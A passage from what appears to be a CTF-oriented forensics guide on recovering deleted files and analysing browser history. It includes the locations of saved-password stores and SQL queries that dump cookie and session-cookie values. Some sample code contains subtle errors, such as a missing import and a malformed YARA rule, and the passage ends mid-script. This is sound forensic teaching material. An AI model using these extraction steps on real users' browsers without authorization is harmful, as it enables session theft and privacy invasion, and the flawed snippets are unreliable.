**Recover Recently Deleted Files (Linux)**:

```bash
# ext3/ext4: extundelete
extundelete --restore-all evidence.dd

# Restore specific file
extundelete --restore-file /path/to/deleted/file evidence.dd

# Restore files deleted after specific time
extundelete --after $(date -d "2025-01-15" +%s) evidence.dd

# Restore entire directory
extundelete --restore-directory /home/user/Documents/ evidence.dd
```

**ext4magic - Advanced Ext4 Recovery**:

```bash
# List recoverable files
ext4magic evidence.dd -a $(date -d "-7 days" +%s) -f recovered_list.txt

# Recover all files deleted in last 24 hours
ext4magic evidence.dd -a $(date -d "-1 day" +%s) -r -m

# Recover specific file by path
ext4magic evidence.dd -r -f /home/user/document.txt

# Save to specific directory
ext4magic evidence.dd -r -f /home/user/document.txt -d /recovery/
```

### Windows Deleted File Recovery

**Recycle Bin Analysis**:

```bash
# Recycle Bin locations:
# Windows 10/11: C:\$Recycle.Bin\<SID>\
# Format: $IXXXXXX.ext (actual file), $RXXXXXX.ext (metadata)

# Extract from image
icat evidence.dd [inode] > recovered_file.dat

# Parse $I file (metadata) with rifiuti2
rifiuti-vista.exe -o recycle_bin_report.txt C:\$Recycle.Bin\

# Shows:
# - Original filename
# - Original path
# - Deletion timestamp
# - File size
```

**MFT-Based Recovery**:

```bash
# Extract MFT
icat -o 2048 evidence.dd 0 > $MFT

# Parse for deleted entries
python analyzeMFT.py -f $MFT -o mft_output.csv

# Filter for deleted files
grep "FILE0" mft_output.csv > deleted_files.csv

# Recover file by MFT entry number
icat -r -o 2048 evidence.dd [MFT_entry] > recovered_file.dat
```

**NTFS File Recovery Tools**:

**ntfsundelete**:

```bash
# Scan for deleted files
ntfsundelete /dev/sdb1

# Recover specific file by percentage match
ntfsundelete -u -m '*.docx' -d /recovery/ /dev/sdb1

# Recover by inode
ntfsundelete -u -i 12345 -d /recovery/ /dev/sdb1

# Recover all possible files
ntfsundelete -u -m '*' -d /recovery/ /dev/sdb1
```

### Autopsy - Digital Forensics Platform

**Autopsy Setup and Usage**:

```bash
# Install Autopsy (GUI application)
# Available for Windows, Linux, macOS

# Create new case
# Add data source (disk image, directory, logical files)
# Autopsy automatically:
# - Extracts deleted files
# - Recovers carved files
# - Analyzes registry
# - Parses browser history
# - Generates timeline
# - Indexes file content

# Access recovered files via GUI:
# Data Sources â†’ File Views â†’ Deleted Files
```

**Autopsy Features**:

- Keyword search across deleted files
- File type detection (ignores extensions)
- Hash database matching (known good/bad files)
- Timeline analysis
- Email parsing
- Registry analysis
- Embedded metadata extraction

### Advanced Recovery from Unallocated Space

**Manual Data Carving**:

```bash
# Extract unallocated space
blkls -A evidence.dd > unallocated.dd

# Hex dump to find file signatures
xxd unallocated.dd | head -1000

# Search for specific file signatures
xxd unallocated.dd | grep -B 2 -A 10 "ffd8 ffe0"  # JPEG header

# Extract data at specific offset
dd if=unallocated.dd of=recovered.jpg skip=12345 bs=1 count=50000
```

**Common File Signatures**:

```
JPEG: FF D8 FF E0/E1/E2
PNG:  89 50 4E 47 0D 0A 1A 0A
GIF:  47 49 46 38 37/39 61
PDF:  25 50 44 46 2D
ZIP:  50 4B 03 04
DOCX: 50 4B 03 04 (ZIP container)
EXE:  4D 5A
ELF:  7F 45 4C 46
```

**Python File Carving Script**:

```python
def carve_files(image_path, signatures, output_dir):
    """
    Basic file carver implementation
    """
    import os
    
    # Define file signatures and footers
    file_sigs = {
        'jpg': {'header': b'\xFF\xD8\xFF', 'footer': b'\xFF\xD9', 'ext': '.jpg'},
        'png': {'header': b'\x89PNG\r\n\x1a\n', 'footer': b'IEND\xaeB`\x82', 'ext': '.png'},
        'pdf': {'header': b'%PDF', 'footer': b'%%EOF', 'ext': '.pdf'},
    }
    
    with open(image_path, 'rb') as f:
        data = f.read()
    
    for file_type in signatures:
        if file_type not in file_sigs:
            continue
            
        sig = file_sigs[file_type]
        header = sig['header']
        footer = sig['footer']
        ext = sig['ext']
        
        offset = 0
        file_num = 0
        
        while True:
            # Find header
            start = data.find(header, offset)
            if start == -1:
                break
            
            # Find footer
            end = data.find(footer, start + len(header))
            if end == -1:
                offset = start + len(header)
                continue
            
            # Extract file
            file_data = data[start:end + len(footer)]
            output_path = os.path.join(output_dir, f'{file_type}_{file_num}{ext}')
            
            with open(output_path, 'wb') as out:
                out.write(file_data)
            
            print(f"Carved: {output_path}")
            file_num += 1
            offset = end + len(footer)

# Usage
carve_files('unallocated.dd', ['jpg', 'png', 'pdf'], '/recovery/')
```

### Fragment Reassembly

**Handling Fragmented Files**:

```bash
# Use file system-aware tools
photorec evidence.dd  # Attempts fragment reassembly

# Manual reassembly requires:
# 1. Identify all fragments (same file signature, similar timestamps)
# 2. Determine correct ordering (sequential content analysis)
# 3. Concatenate fragments
cat fragment1.dat fragment2.dat fragment3.dat > reassembled_file.pdf

# Validate reconstructed file
file reassembled_file.pdf
pdfinfo reassembled_file.pdf  # For PDFs
```

### SQLite Database Recovery

**Deleted Record Recovery from SQLite**:

```bash
# Copy database
cp application.db recovered.db

# Use sqlite3 to check structure
sqlite3 recovered.db ".schema"

# Export all data (including deleted records in unallocated pages)
sqlite3 recovered.db ".dump" > database_dump.sql

# Use undark for deleted record recovery
undark -i application.db --freelist --export-csv

# Or sqlparse for forensic analysis
python sqlparse.py application.db > recovered_records.txt
```

**Browser SQLite Recovery**:

```bash
# Chrome history database with deleted entries
cp ~/.config/google-chrome/Default/History History_copy.db

# Extract all records including deleted
strings History_copy.db | grep "http" > urls.txt

# Use browser forensics tools
python hindsight.py -i ~/.config/google-chrome/Default/ -o chrome_analysis/
```

### Registry Deleted Key Recovery (Windows)

**Registry Transaction Logs**:

```bash
# Registry hive files often have transaction logs
# Files: NTUSER.DAT, NTUSER.DAT.LOG1, NTUSER.DAT.LOG2

# Extract from image
icat evidence.dd [inode_NTUSER.DAT] > NTUSER.DAT
icat evidence.dd [inode_LOG1] > NTUSER.DAT.LOG1
icat evidence.dd [inode_LOG2] > NTUSER.DAT.LOG2

# Parse with RegRipper
rip.pl -r NTUSER.DAT -p all > registry_analysis.txt

# Analyze transaction logs for deleted keys

# Use Registry Explorer or regipy for Python-based analysis
````

**regipy - Python Registry Parser**:
```python
from regipy.registry import RegistryHive

# Load registry hive
reg = RegistryHive('NTUSER.DAT')

# Enumerate all keys (including recovered from slack space)
for entry in reg.recurse_subkeys(as_json=True):
    print(entry)

# Search for specific deleted keys
# Deleted keys may exist in unallocated registry space
````

**Registry Deleted Key Indicators**:

- Keys in unallocated cells
- Orphaned keys (parent deleted but child remains)
- Transaction log entries for deleted operations

### Memory Dump File Recovery

**Volatility - Memory Forensics Framework**:

```bash
# Identify profile
volatility -f memory.dmp imageinfo

# List processes
volatility -f memory.dmp --profile=Win10x64 pslist

# Dump process memory
volatility -f memory.dmp --profile=Win10x64 memdump -p 1234 -D output/

# Extract files from memory
volatility -f memory.dmp --profile=Win10x64 filescan
volatility -f memory.dmp --profile=Win10x64 dumpfiles -Q 0x000000007e410890 -D output/

# Scan for file signatures in memory
volatility -f memory.dmp --profile=Win10x64 yarascan -Y "rule PDF { strings: $ = {%PDF} condition: $ }"

# Extract clipboard contents
volatility -f memory.dmp --profile=Win10x64 clipboard

# Recover command history
volatility -f memory.dmp --profile=Win10x64 cmdscan
volatility -f memory.dmp --profile=Win10x64 consoles
```

**Bulk Extractor on Memory Dumps**:

```bash
# Extract artifacts from memory
bulk_extractor -o memory_output/ memory.dmp

# Recovers:
# - Partial files
# - URLs and email addresses
# - Credit card numbers
# - Encryption keys
# - Network packets
```

### Shadow Copy Analysis (Windows)

**Volume Shadow Copies** contain point-in-time snapshots with potentially recoverable deleted files:

```bash
# List shadow copies (Windows)
vssadmin list shadows

# Mount shadow copy
mklink /d C:\Shadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\

# Access deleted files from shadow copy
dir C:\Shadow\Users\username\Documents\

# Copy recovered files
xcopy C:\Shadow\Users\username\Documents\deleted_file.txt C:\Recovery\
```

**vshadowmount (Linux)**:

```bash
# Mount NTFS image with shadow copies
vshadowmount -o $(($partition_offset * 512)) evidence.dd /mnt/vss/

# List available shadow copies
ls /mnt/vss/

# Mount specific shadow copy
mount -o ro,loop /mnt/vss/vss2 /mnt/shadow_copy/

# Access deleted files
ls /mnt/shadow_copy/Users/username/Documents/
```

### Cloud Storage Sync Folder Recovery

**Dropbox/OneDrive/Google Drive Local Cache**:

```bash
# Dropbox cache location (may contain deleted files)
# Windows: %LOCALAPPDATA%\Dropbox\
# Linux: ~/.dropbox/cache/

# Search for deleted files in cache
find ~/.dropbox/cache/ -type f -exec file {} \;

# OneDrive recycle bin
# Windows: C:\Users\username\OneDrive\.recycle\

# Google Drive cache
# Windows: %LOCALAPPDATA%\Google\Drive\
```

### Encrypted File Recovery

**Partial Encryption Recovery**:

```bash
# Some ransomware only encrypts file headers
# Original data may remain in slack space or unallocated clusters

# Extract file including slack space
icat -s evidence.dd [inode] > file_with_slack.dat

# Analyze file structure
xxd file_with_slack.dat | less

# Search for original data patterns
strings file_with_slack.dat | grep -i "original_content"
```

**Unencrypted Metadata Recovery**:

```bash
# JPEG EXIF data often survives partial encryption
exiftool partially_encrypted.jpg

# Office document metadata (ZIP structure)
unzip -l encrypted_document.docx

# PDF metadata
pdfinfo encrypted.pdf 2>/dev/null
```

### Solid State Drive (SSD) Considerations

**TRIM Command Impact**: [Unverified: TRIM effectiveness varies by SSD controller and firmware version]

```bash
# Check if TRIM is enabled
sudo fstrim -v /

# TRIM immediately deallocates deleted blocks
# Makes traditional recovery methods ineffective
# Recovery must occur before TRIM executes
```

**SSD Recovery Strategies**:

1. **Immediate imaging** before TRIM operations
2. **Firmware-level access** (vendor-specific tools)
3. **Controller chip reading** (requires specialized hardware)
4. **Over-provisioning area** analysis [Advanced technique, vendor-specific]

### Mobile Device Deleted File Recovery

**Android Deleted File Recovery**:

```bash
# Root required for most recovery methods

# userdata partition imaging
adb shell su -c "dd if=/dev/block/mmcblk0p29 of=/sdcard/userdata.img"
adb pull /sdcard/userdata.img

# Carve from image
photorec userdata.img

# SQLite database recovery (messages, contacts)
adb pull /data/data/com.android.providers.telephony/databases/mmssms.db
undark -i mmssms.db --export-csv > recovered_messages.csv

# WhatsApp database recovery
adb pull /data/data/com.whatsapp/databases/msgstore.db
sqlite3 msgstore.db ".schema"
```

**iOS Deleted File Recovery**:

```bash
# Requires jailbroken device or backup analysis

# Extract data partition (jailbroken)
ssh root@<device_ip> "dd if=/dev/disk0s1s1" | dd of=ios_data.img

# Analyze iTunes backup for deleted data
cd ~/Library/Application\ Support/MobileSync/Backup/<device_uuid>/

# Manifest.db contains file index
sqlite3 Manifest.db "SELECT * FROM Files WHERE flags=1;"  # Deleted files

# Carve backup files
photorec -d . -d recovered/ *.mddata
```

### Forensic Validation and Documentation

**Hash Verification**:

```bash
# Create hash before recovery
md5sum evidence.dd > evidence_original.md5
sha256sum evidence.dd > evidence_original.sha256

# Verify image integrity after recovery operations
md5sum -c evidence_original.md5

# Hash recovered files
md5deep -r recovered_files/ > recovered_hashes.txt
```

**Chain of Custody Documentation**:

```bash
# Document recovery process
cat > recovery_log.txt << EOF
Case ID: CTF-2025-001
Evidence: evidence.dd
Date: $(date)
Analyst: [Name]
Hash (MD5): $(md5sum evidence.dd | cut -d' ' -f1)
Hash (SHA256): $(sha256sum evidence.dd | cut -d' ' -f1)

Recovery Steps:
1. Image acquired using dd
2. Image mounted read-only
3. Deleted files extracted using extundelete
4. Files carved from unallocated space using foremost
5. Results stored in: /case/recovered/

Total Files Recovered: $(find recovered_files/ -type f | wc -l)
EOF
```

### Anti-Forensics Detection

**Identify Counter-Forensic Techniques**:

**File Wiping Detection**:

```bash
# Check for secure deletion tools
strings evidence.dd | grep -i "wipe\|shred\|srm\|eraser"

# Identify patterns of secure wiping (multiple overwrites)
# Unallocated space filled with zeros, ones, or random data

# Analyze with bulk_extractor
bulk_extractor -S zero_histogram -o output/ evidence.dd
```

**Timestomping Detection**:

```bash
# Compare filesystem timestamps with log entries
# Example: File modified timestamp = 2020-01-01, but access log shows 2025-01-15

# Check for round numbers (suspicious)
find /mnt/evidence -type f -printf "%TY-%Tm-%Td %TH:%TM:%TS %p\n" | grep ":00:00.000000000"

# NTFS: Compare $SI vs $FN timestamps
python analyzeMFT.py -f $MFT | grep -E "SI.*FN" | awk '$4 != $8'
```

**Encryption Indicators**:

```bash
# High entropy indicates encryption or compression
ent evidence.dd

# Entropy analysis with binwalk
binwalk -E evidence.dd

# Expected entropy:
# - Text files: 3-5 bits/byte
# - Compressed: 7-8 bits/byte
# - Encrypted: ~7.9-8 bits/byte
```

**Data Destruction Tools Detection**:

```bash
# Search for artifact remnants of destruction tools
strings evidence.dd | grep -iE "ccleaner|bleachbit|dban|killdisk"

# Check for tool installation in registry (Windows)
rip.pl -r SOFTWARE -p uninstall | grep -i "wipe\|clean\|erase"

# Linux: Check package history
cat /var/log/apt/history.log | grep -i "shred\|wipe\|srm"
```

### Partial File Recovery and Repair

**Repair Corrupted or Partial Files**:

**JPEG Repair**:

```bash
# Extract partial JPEG
foremost -t jpg -i evidence.dd -o output/

# Attempt repair with jpeginfo
jpeginfo -c partial.jpg

# Manual header/footer repair
# Add missing JPEG header: FF D8 FF E0
printf '\xFF\xD8\xFF\xE0' | cat - partial.jpg > repaired.jpg

# Use JPEG repair tools
jpg-repair partial.jpg repaired.jpg
```

**PDF Repair**:

```bash
# Check PDF structure
pdfinfo partial.pdf

# Repair with pdftk
pdftk partial.pdf output repaired.pdf

# Recover text from corrupted PDF
pdftotext -raw partial.pdf recovered_text.txt

# Manual repair: Extract text objects
strings partial.pdf | grep "BT\|ET" -A 5
```

**ZIP Repair**:

```bash
# Attempt automatic repair
zip -F corrupted.zip --out repaired.zip

# More aggressive repair
zip -FF corrupted.zip --out repaired.zip

# Extract what's possible
unzip -t corrupted.zip  # Test integrity
unzip corrupted.zip  # Extract working files, ignore errors
```

**Office Document Recovery**:

```bash
# DOCX/XLSX are ZIP containers
unzip document.docx -d extracted/

# Extract text from XML
cat extracted/word/document.xml | grep -oP '(?<=<w:t>).*?(?=</w:t>)'

# Repair using LibreOffice
libreoffice --headless --convert-to pdf corrupted.docx
```

### Integrated Deleted File Recovery Workflow

**Step-by-Step Recovery Process**:

1. **Acquire and Preserve**:

```bash
# Create forensic image
dc3dd if=/dev/sdb of=evidence.dd hash=md5 hash=sha256 log=acquisition.log

# Create working copy
cp evidence.dd evidence_working.dd

# Verify integrity
md5sum evidence.dd > evidence.md5
```

2. **Initial Analysis**:

```bash
# Identify filesystem
fsstat evidence_working.dd

# List deleted files
fls -rd evidence_working.dd > deleted_files.txt

# Create timeline
fls -r -m / evidence_working.dd > bodyfile.txt
mactime -b bodyfile.txt -d > timeline.csv
```

3. **Filesystem-Based Recovery**:

```bash
# Ext4 recovery
extundelete --restore-all evidence_working.dd

# NTFS recovery
ntfsundelete -u -m '*' -d /recovery/ evidence_working.dd

# Extract specific inodes
while read inode; do
    icat -r evidence_working.dd $inode > recovered_$inode.dat
done < inode_list.txt
```

4. **Carving Unallocated Space**:

```bash
# Extract unallocated space
blkls evidence_working.dd > unallocated.dd

# Carve files
foremost -t all -i unallocated.dd -o carved_foremost/
scalpel unallocated.dd -o carved_scalpel/
photorec /log /d carved_photorec/ unallocated.dd
```

5. **Advanced Recovery**:

```bash
# SQLite database recovery
undark -i databases/*.db --freelist --export-csv

# Registry recovery (Windows)
rip.pl -r NTUSER.DAT -p all > registry_analysis.txt

# Browser history recovery
hindsight.py -i chrome_profile/ -o browser_analysis/

# Email recovery
readpst outlook.pst -o recovered_emails/
```

6. **Validation and Analysis**:

```bash
# Verify recovered files
file recovered_files/* > file_types.txt

# Calculate hashes
md5deep -r recovered_files/ > recovered_hashes.txt

# Compare with known file hashes (NSRL, custom databases)
hashdeep -k known_hashes.txt -a -r recovered_files/

# Extract metadata
exiftool -r -csv recovered_files/ > metadata.csv
```

7. **Documentation**:

```bash
# Generate report
cat > recovery_report.txt << EOF
=== Digital Forensics Recovery Report ===
Case: CTF-2025-001
Date: $(date)
Evidence: evidence.dd (MD5: $(md5sum evidence.dd | cut -d' ' -f1))

Summary:
- Total files recovered: $(find recovered_files/ -type f | wc -l)
- File types: $(file recovered_files/* | cut -d: -f2 | sort | uniq -c)
- Date range: $(stat --format='%y' recovered_files/* | sort | head -1) to $(stat --format='%y' recovered_files/* | sort | tail -1)

Key Findings:
- Deleted documents containing sensitive information
- Browser history showing access to suspicious websites
- Recovered emails with attachments
- SQLite databases with deleted records

Tools Used:
- Sleuth Kit (fls, icat, blkls)
- Extundelete/ntfsundelete
- Foremost, Scalpel, PhotoRec
- Bulk Extractor
- Volatility (for memory analysis)

Chain of Custody: Maintained throughout analysis
All operations performed on working copy
Original evidence preserved with verified hashes
EOF
```

---

## Forensic Analysis Best Practices

### Read-Only Operations

```bash
# Always mount forensic images read-only
mount -o ro,loop,noexec,nodev evidence.dd /mnt/evidence/

# Use write blockers for physical media
# Hardware write blockers prevent accidental modification

# Work on copies, never originals
cp evidence.dd evidence_working.dd
```

### Hash Everything

```bash
# Original evidence
md5sum evidence.dd > evidence.md5
sha256sum evidence.dd >> evidence.sha256

# Recovered files
md5deep -r recovered/ > recovered_hashes.txt

# Verify chain of custody
md5sum -c evidence.md5
```

### Document All Actions

```bash
# Maintain detailed logs
script -a forensic_session.log

# Record commands executed
history > command_history.txt

# Screenshot key findings
# Use GUI tools with built-in reporting
```

### Time Synchronization

```bash
# Use UTC for consistency
export TZ=UTC
date

# Document timezone offsets
zdump -v /etc/localtime

# Convert timestamps
date -d @1234567890
```

### Legal and Ethical Considerations

- Obtain proper authorization before analysis
- Maintain chain of custody documentation
- Preserve original evidence integrity
- Document methodology for court admissibility
- Follow organizational and legal guidelines
- Respect privacy and data protection regulations

**Key Recovery Priorities in CTF Scenarios**:

1. Hidden flags in deleted files
2. Credentials in recovered databases
3. Steganographic data in carved images
4. Timeline reconstruction for challenge narrative
5. Artifact correlation across multiple sources

---

Forensics and artifact analysis involves collecting, preserving, and examining digital evidence from systems to reconstruct events, identify malicious activity, and support investigations. This discipline requires understanding where artifacts are stored and how to interpret them.

## Browser History Analysis

Browser history analysis examines web browsing artifacts including URLs visited, downloads, cookies, cache, and form data across different browsers.

### Browser Artifact Locations

**Google Chrome/Chromium**

```bash
# Linux locations
~/.config/google-chrome/Default/
~/.config/chromium/Default/

# Key files
~/.config/google-chrome/Default/History                 # Browsing history
~/.config/google-chrome/Default/Cookies                 # Cookies database
~/.config/google-chrome/Default/Web Data                # Form data, autofill
~/.config/google-chrome/Default/Login Data              # Saved passwords
~/.config/google-chrome/Default/Bookmarks               # Bookmarks (JSON)
~/.config/google-chrome/Default/Cache/                  # Cached files
~/.config/google-chrome/Default/Downloads               # Download history
~/.config/google-chrome/Default/Top Sites               # Frequently visited

# Windows locations
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\History
C:\Users\<username>\AppData\Local\Google\Chrome\User Data\Default\Cookies

# macOS locations
~/Library/Application Support/Google/Chrome/Default/History
~/Library/Application Support/Google/Chrome/Default/Cookies
```

**Mozilla Firefox**

```bash
# Linux locations
~/.mozilla/firefox/<profile>/

# Key files
~/.mozilla/firefox/<profile>/places.sqlite             # History, bookmarks
~/.mozilla/firefox/<profile>/cookies.sqlite            # Cookies
~/.mozilla/firefox/<profile>/formhistory.sqlite        # Form data
~/.mozilla/firefox/<profile>/logins.json               # Saved passwords
~/.mozilla/firefox/<profile>/key4.db                   # Password encryption key
~/.mozilla/firefox/<profile>/cache2/                   # Cache directory
~/.mozilla/firefox/<profile>/downloads.sqlite          # Download history

# Windows locations
C:\Users\<username>\AppData\Roaming\Mozilla\Firefox\Profiles\<profile>\

# macOS locations
~/Library/Application Support/Firefox/Profiles/<profile>/
```

**Safari (macOS/iOS)**

```bash
# macOS locations
~/Library/Safari/History.db                            # Browsing history
~/Library/Safari/Downloads.plist                       # Download history
~/Library/Cookies/Cookies.binarycookies               # Cookies
~/Library/Safari/Bookmarks.plist                       # Bookmarks
~/Library/Caches/com.apple.Safari/Cache.db            # Cache database

# iOS locations (requires jailbreak or backup extraction)
/var/mobile/Library/Safari/History.plist
/var/mobile/Library/Cookies/Cookies.binarycookies
```

**Microsoft Edge**

```bash
# Windows locations
C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\History
C:\Users\<username>\AppData\Local\Microsoft\Edge\User Data\Default\Cookies

# Linux locations
~/.config/microsoft-edge/Default/History
~/.config/microsoft-edge/Default/Cookies
```

### SQLite Database Analysis

**[Inference]** Most modern browsers store artifacts in SQLite databases, which can be queried directly.

**Browsing History Extraction (Chrome)**

```bash
# Copy database (browser must be closed)
cp ~/.config/google-chrome/Default/History /tmp/History

# Query with sqlite3
sqlite3 /tmp/History

# List tables
.tables

# View schema
.schema urls

# Extract browsing history
SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visit_time,
       url, 
       title, 
       visit_count
FROM urls
ORDER BY last_visit_time DESC
LIMIT 100;

# Search for specific URLs
SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as visit_time,
       url, 
       title
FROM urls
WHERE url LIKE '%facebook.com%'
ORDER BY last_visit_time DESC;

# Export to CSV
.headers on
.mode csv
.output history.csv
SELECT * FROM urls;
.quit
```

**Download History Extraction (Chrome)**

```bash
sqlite3 /tmp/History

# View downloads table schema
.schema downloads

# Extract download history
SELECT datetime(start_time/1000000-11644473600, 'unixepoch', 'localtime') as download_time,
       target_path,
       tab_url,
       total_bytes,
       state
FROM downloads
ORDER BY start_time DESC;

# Search for specific file types
SELECT datetime(start_time/1000000-11644473600, 'unixepoch', 'localtime') as download_time,
       target_path
FROM downloads
WHERE target_path LIKE '%.exe' OR target_path LIKE '%.pdf'
ORDER BY start_time DESC;
```

**Cookie Analysis (Chrome)**

```bash
sqlite3 ~/.config/google-chrome/Default/Cookies

# List tables
.tables

# View cookies schema
.schema cookies

# Extract cookies
SELECT host_key,
       name,
       value,
       datetime(creation_utc/1000000-11644473600, 'unixepoch') as created,
       datetime(expires_utc/1000000-11644473600, 'unixepoch') as expires,
       is_secure,
       is_httponly
FROM cookies
ORDER BY creation_utc DESC
LIMIT 100;

# Extract cookies for specific domain
SELECT host_key,
       name,
       value,
       path
FROM cookies
WHERE host_key LIKE '%example.com%';

# Extract session cookies
SELECT host_key, name, value
FROM cookies
WHERE is_persistent = 0;
```

**Firefox History Analysis**

```bash
# Copy places.sqlite
cp ~/.mozilla/firefox/<profile>/places.sqlite /tmp/places.sqlite

sqlite3 /tmp/places.sqlite

# List tables
.tables

# View schema
.schema moz_places
.schema moz_historyvisits

# Extract browsing history
SELECT datetime(moz_historyvisits.visit_date/1000000, 'unixepoch', 'localtime') as visit_time,
       moz_places.url,
       moz_places.title,
       moz_places.visit_count
FROM moz_places, moz_historyvisits
WHERE moz_places.id = moz_historyvisits.place_id
ORDER BY visit_date DESC
LIMIT 100;

# Extract bookmarks
SELECT moz_bookmarks.title,
       moz_places.url,
       datetime(moz_bookmarks.dateAdded/1000000, 'unixepoch') as added
FROM moz_bookmarks
JOIN moz_places ON moz_bookmarks.fk = moz_places.id
WHERE moz_bookmarks.type = 1
ORDER BY dateAdded DESC;

# Search history by keyword
SELECT datetime(visit_date/1000000, 'unixepoch', 'localtime') as visit_time,
       url,
       title
FROM moz_historyvisits
JOIN moz_places ON moz_historyvisits.place_id = moz_places.id
WHERE url LIKE '%search_term%' OR title LIKE '%search_term%'
ORDER BY visit_date DESC;
```

### Automated Browser Forensics Tools

**Hindsight (Chrome/Chromium Analysis)**

```bash
# Install Hindsight
git clone https://github.com/obsidianforensics/hindsight.git
cd hindsight
pip install -r requirements.txt

# Analyze Chrome profile
python hindsight.py -i ~/.config/google-chrome/Default/ -o /tmp/chrome_analysis/

# Output formats: SQLite, Excel, JSON
python hindsight.py -i ~/.config/google-chrome/Default/ -o /tmp/output/ -f sqlite

# Analyze specific artifacts
python hindsight.py -i ~/.config/google-chrome/Default/ -o /tmp/output/ --type history

# Generate timeline
python hindsight.py -i ~/.config/google-chrome/Default/ -o /tmp/output/ -f xlsx

# Results include:
# - Browsing history with timestamps
# - Download history
# - Cookie analysis
# - Autofill data
# - Login data references
```

**dumpzilla (Firefox Analysis)**

```bash
# Download dumpzilla
git clone https://github.com/Busindre/dumpzilla.git
cd dumpzilla

# Run dumpzilla
python dumpzilla.py ~/.mozilla/firefox/<profile>/

# Extract all artifacts
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --All

# Extract specific artifacts
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --History
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --Cookies
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --Downloads

# Export to file
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --All > firefox_analysis.txt

# Extract thumbnails
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --Thumbnails

# Extract DOM storage
python dumpzilla.py ~/.mozilla/firefox/<profile>/ --DOM
```

**Browser History Viewer (BHV)**

```bash
# Install
pip install browser-history

# Python usage
python3 << EOF
from browser_history import get_history

outputs = get_history()

# Get browsing history from all browsers
histories = outputs.histories

for browser, history in histories.items():
    print(f"\n{browser} History:")
    for entry in history[:10]:  # First 10 entries
        print(f"  {entry[0]} - {entry[1]}")
EOF
```

**Python Browser History Extraction Script**

```python
#!/usr/bin/env python3
import sqlite3
import os
import sys
from datetime import datetime
import json

class BrowserForensics:
    def __init__(self):
        self.results = {
            'history': [],
            'downloads': [],
            'cookies': [],
            'searches': []
        }
    
    def chrome_timestamp_to_datetime(self, timestamp):
        """Convert Chrome timestamp to datetime"""
        try:
            # Chrome uses microseconds since 1601-01-01
            epoch_start = datetime(1601, 1, 1)
            delta = timedelta(microseconds=timestamp)
            return (epoch_start + delta).strftime('%Y-%m-%d %H:%M:%S')
        except:
            return "Unknown"
    
    def firefox_timestamp_to_datetime(self, timestamp):
        """Convert Firefox timestamp to datetime"""
        try:
            # Firefox uses microseconds since Unix epoch
            return datetime.fromtimestamp(timestamp/1000000).strftime('%Y-%m-%d %H:%M:%S')
        except:
            return "Unknown"
    
    def analyze_chrome(self, profile_path):
        """Analyze Chrome browser artifacts"""
        
        history_db = os.path.join(profile_path, 'History')
        
        if not os.path.exists(history_db):
            print(f"[-] Chrome History not found: {history_db}")
            return
        
        print(f"[+] Analyzing Chrome profile: {profile_path}")
        
        # Copy database
        temp_db = '/tmp/chrome_history.db'
        os.system(f'cp "{history_db}" "{temp_db}"')
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Extract browsing history
        try:
            cursor.execute("""
                SELECT url, title, visit_count, last_visit_time
                FROM urls
                ORDER BY last_visit_time DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                self.results['history'].append({
                    'browser': 'Chrome',
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'timestamp': self.chrome_timestamp_to_datetime(row[3])
                })
        except Exception as e:
            print(f"[-] Error extracting history: {e}")
        
        # Extract downloads
        try:
            cursor.execute("""
                SELECT target_path, tab_url, total_bytes, start_time
                FROM downloads
                ORDER BY start_time DESC
            """)
            
            for row in cursor.fetchall():
                self.results['downloads'].append({
                    'browser': 'Chrome',
                    'path': row[0],
                    'url': row[1],
                    'size': row[2],
                    'timestamp': self.chrome_timestamp_to_datetime(row[3])
                })
        except Exception as e:
            print(f"[-] Error extracting downloads: {e}")
        
        # Extract search queries
        try:
            cursor.execute("""
                SELECT term, normalized_term, url_id
                FROM keyword_search_terms
            """)
            
            for row in cursor.fetchall():
                self.results['searches'].append({
                    'browser': 'Chrome',
                    'term': row[0],
                    'normalized': row[1]
                })
        except Exception as e:
            print(f"[-] Error extracting searches: {e}")
        
        conn.close()
        os.remove(temp_db)
    
    def analyze_firefox(self, profile_path):
        """Analyze Firefox browser artifacts"""
        
        places_db = os.path.join(profile_path, 'places.sqlite')
        
        if not os.path.exists(places_db):
            print(f"[-] Firefox places.sqlite not found: {places_db}")
            return
        
        print(f"[+] Analyzing Firefox profile: {profile_path}")
        
        # Copy database
        temp_db = '/tmp/firefox_places.db'
        os.system(f'cp "{places_db}" "{temp_db}"')
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # Extract browsing history
        try:
            cursor.execute("""
                SELECT moz_places.url, moz_places.title, 
                       moz_places.visit_count, moz_historyvisits.visit_date
                FROM moz_places
                JOIN moz_historyvisits ON moz_places.id = moz_historyvisits.place_id
                ORDER BY visit_date DESC
                LIMIT 1000
            """)
            
            for row in cursor.fetchall():
                self.results['history'].append({
                    'browser': 'Firefox',
                    'url': row[0],
                    'title': row[1],
                    'visit_count': row[2],
                    'timestamp': self.firefox_timestamp_to_datetime(row[3])
                })
        except Exception as e:
            print(f"[-] Error extracting history: {e}")
        
        # Extract downloads
        try:
            cursor.execute("""
                SELECT content, dateAdded
                FROM moz_annos
                JOIN moz_anno_attributes ON moz_annos.anno_attribute_id = moz_anno_attributes.id
                WHERE name = 'downloads/destinationFileURI'
                ORDER BY dateAdded DESC
            """)
            
            for row in cursor.fetchall():
                self.results['downloads'].append({
                    'browser': 'Firefox',
                    'path': row[0],
                    'timestamp': self.firefox_timestamp_to_datetime(row[1])
                })
        except Exception as e:
            print(f"[-] Error extracting downloads: {e}")
        
        conn.close()
        os.remove(temp_db)
    
    def generate_report(self, output_file):
        """Generate forensics report"""
        
        print(f"\n[+] Generating report: {output_file}")
        
        with open(output_file, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("BROWSER FORENSICS REPORT\n")
            f.write("=" * 80 + "\n\n")
            
            # History
